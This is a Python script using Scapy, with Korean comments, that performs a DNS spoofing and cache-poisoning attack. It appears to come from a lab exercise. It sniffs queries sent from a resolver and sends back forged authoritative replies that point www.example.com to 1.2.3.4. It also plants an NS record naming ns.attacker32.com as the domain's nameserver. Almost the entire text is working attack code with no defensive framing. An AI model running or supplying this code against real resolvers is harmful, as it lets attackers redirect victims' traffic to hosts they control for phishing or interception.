from scapy.all import *
def spoof_dns(pkt):
# DNS 패킷과 특정 도메인('www.example.com')이 요청된 경우 처리
if DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8'):
# IP 헤더 구성
IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
# UDP 헤더 구성
UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
# 응답 섹션 (Answer) 구성
Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=259200)
# 네임 서버 섹션 (Authority) 구성
NSsec = DNSRR(rrname="example.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
# DNS 헤더 구성
DNSpkt = DNS(
id=pkt[DNS].id, # 원래 요청의 ID
aa=1,
# 권한 있는 응답 표시
rd=0,
# 재귀 요청 플래그 해제
qdcount=1,
# 쿼리의 개수
qr=1,
# 응답 플래그
ancount=1,
# 응답 레코드 개수
nscount=1,
# 네임 서버 레코드 개수
qd=pkt[DNS].qd, # 원래 쿼리 유지
an=Anssec,
# Answer 섹션 추가
ns=NSsec
# Authority 섹션 추가
)
# 스푸핑 패킷 생성
spoofpkt = IPpkt / UDPpkt / DNSpkt
# 스푸핑 패킷 전송
send(spoofpkt)
# 스니핑 필터: UDP 패킷, 소스가 특정 DNS 서버, 목적지가 포트 53인 경우
f = 'udp and (src host 10.9.0.53 and dst port 53)'
# 패킷 캡처 및 스푸핑 함수 호출
pkt = sniff(iface=eth0, filter=f, prn=spoof_dns) # 인터페이스 이름은 eth0
